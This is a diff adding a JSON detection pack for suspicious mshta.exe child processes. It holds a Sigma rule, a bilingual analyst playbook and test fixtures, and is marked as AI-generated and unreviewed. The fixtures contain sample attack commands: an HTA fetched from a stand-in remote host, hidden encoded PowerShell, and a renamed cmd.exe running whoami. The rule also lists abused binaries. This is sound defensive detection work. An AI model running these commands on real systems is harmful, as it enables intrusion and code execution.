@@ -1,0 +1,134 @@
+{
+  "rule": {
+    "id": "03cc0c25-389f-4bf8-b48d-11878079f1ca",
+    "title": "Suspicious MSHTA Child Process",
+    "level": "high",
+    "status": "test",
+    "author": "Michael Haag",
+    "path": "windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218.005"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "mshta.exe inició un intérprete de comandos, un motor de scripts o una utilidad LOLBin como cmd, PowerShell, wscript, reg, regsvr32 o bitsadmin. Es típico de una aplicación HTA maliciosa que ejecuta su payload.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde ParentImage termina en \\mshta.exe y el proceso hijo es cmd, powershell, pwsh, wscript, cscript, sh, bash, reg, regsvr32 o bitsadmin. El hijo se identifica por Image o por OriginalFileName, así que también se detectan binarios renombrados.",
+      "why_it_matters": "mshta.exe es un binario firmado de Microsoft que ejecuta archivos HTA con VBScript o JScript. Los atacantes lo usan como proxy para evadir controles (ATT&CK T1218.005, System Binary Proxy Execution: Mshta) y descargar o lanzar etapas posteriores.",
+      "triage_steps": [
+        "Revise el CommandLine del proceso mshta.exe padre: busque URLs remotas, rutas en %TEMP%, Downloads o adjuntos, y código inline con vbscript: o javascript:.",
+        "Revise el CommandLine del hijo (Image u OriginalFileName): busque PowerShell codificado (-enc), descargas, uso de bitsadmin /transfer, regsvr32 /i:http o cambios en claves Run con reg add.",
+        "Si Image no coincide con OriginalFileName, trátelo como binario renombrado y obtenga el hash y la ruta del archivo.",
+        "Identifique el abuelo de mshta.exe: Outlook, un navegador, explorer.exe o WINWORD sugieren phishing; un instalador de impresora firmado sugiere un falso positivo.",
+        "Revise el mismo host dentro de +/- 15 minutos: conexiones de red, archivos creados, tareas programadas, servicios nuevos y otros procesos hijos.",
+        "Pivote por el usuario y el hash del HTA: busque alertas previas, el mismo HTA o la misma URL en otros endpoints."
+      ],
+      "false_positives": [
+        "Instaladores de drivers o software de impresoras que usan HTA para su interfaz y llaman a cmd o reg.",
+        "Software de HP que lanza scripts auxiliares desde mshta.exe.",
+        "Herramientas internas de TI o asistentes de configuración antiguos basados en HTA, ubicados en rutas conocidas y firmados."
+      ],
+      "response_steps": [
+        "Verifique la legitimidad: confirme el instalador o la herramienta con el usuario o TI y valide firmas y rutas.",
+        "Si es malicioso, aísle el endpoint y termine el árbol de procesos de mshta.exe tras capturar la evidencia.",
+        "Bloquee las URLs, dominios y hashes asociados en el proxy, el EDR y el correo; busque el mismo indicador en toda la flota.",
+        "Elimine la persistencia identificada (claves Run, tareas, servicios) y los archivos descargados, preservando copias para análisis.",
+        "Restablezca las credenciales del usuario si hubo ejecución de payload y considere restringir mshta.exe mediante AppLocker o WDAC."
+      ],
+      "severity_rationale": "El nivel high se justifica porque mshta.exe rara vez lanza shells o LOLBins de forma legítima, y este patrón suele indicar ejecución de código malicioso."
+    },
+    "en": {
+      "summary": "mshta.exe spawned a shell, script host or LOLBin such as cmd, PowerShell, wscript, reg, regsvr32 or bitsadmin. This typically means a malicious HTA application is running its payload.",
+      "what_it_detects": "Windows process creation events where ParentImage ends with \\mshta.exe and the child is cmd, powershell, pwsh, wscript, cscript, sh, bash, reg, regsvr32 or bitsadmin. The child is matched by Image or OriginalFileName, so renamed binaries are also caught.",
+      "why_it_matters": "mshta.exe is a signed Microsoft binary that runs HTA files containing VBScript or JScript. Attackers use it as a proxy to evade defenses (ATT&CK T1218.005, System Binary Proxy Execution: Mshta) and launch later stages.",
+      "triage_steps": [
+        "Review the parent mshta.exe CommandLine: look for remote URLs, paths in %TEMP%, Downloads or mail attachments, and inline vbscript: or javascript: code.",
+        "Review the child CommandLine: look for encoded PowerShell (-enc), downloads, bitsadmin /transfer, regsvr32 /i:http or reg add on Run keys.",
+        "If Image does not match OriginalFileName, treat it as a renamed binary and collect its hash and path.",
+        "Identify mshta.exe's own parent: Outlook, a browser, explorer.exe or WINWORD suggest phishing; a signed printer installer suggests a false positive.",
+        "Check the same host within +/- 15 minutes: network connections, dropped files, scheduled tasks, new services and other child processes.",
+        "Pivot on the user and HTA hash or URL: look for earlier alerts and the same artifact on other endpoints."
+      ],
+      "false_positives": [
+        "Printer driver or software installers that use an HTA interface and call cmd or reg.",
+        "HP software launching helper scripts from mshta.exe.",
+        "Legacy internal IT tools or setup wizards built on HTA, signed and located in known paths."
+      ],
+      "response_steps": [
+        "Verify legitimacy: confirm the installer or tool with the user or IT and validate signatures and paths.",
+        "If malicious, isolate the endpoint and terminate the mshta.exe process tree after capturing evidence.",
+        "Block related URLs, domains and hashes on proxy, EDR and mail; hunt for the same indicators fleet-wide.",
+        "Remove identified persistence (Run keys, tasks, services) and downloaded files, keeping copies for analysis.",
+        "Reset the user's credentials if a payload ran, and consider restricting mshta.exe with AppLocker or WDAC."
+      ],
+      "severity_rationale": "High fits because mshta.exe rarely launches shells or LOLBins legitimately, and this pattern usually indicates malicious code execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "mshta.exe running a remote HTA spawns encoded PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+          "ParentCommandLine": "\"C:\\Windows\\System32\\mshta.exe\" http://update.example.com/invoice.hta",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA"
+        }
+      },
+      {
+        "description": "mshta.exe spawns a renamed cmd.exe identified only by OriginalFileName",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "ParentImage": "C:\\Windows\\SysWOW64\\mshta.exe",
+          "ParentCommandLine": "\"C:\\Windows\\SysWOW64\\mshta.exe\" C:\\Users\\mrojas\\Downloads\\factura.hta",
+          "Image": "C:\\Users\\Public\\svchelper.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "CommandLine": "svchelper.exe /c whoami > C:\\Users\\Public\\o.txt"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "mshta.exe opens a browser child, which is not in the suspicious child list",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+          "ParentCommandLine": "\"C:\\Windows\\System32\\mshta.exe\" C:\\Program Files\\Contoso\\help.hta",
+          "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+          "OriginalFileName": "msedge.exe",
+          "CommandLine": "msedge.exe https://www.example.org/help"
+        }
+      },
+      {
+        "description": "PowerShell launched by explorer.exe, not by mshta.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
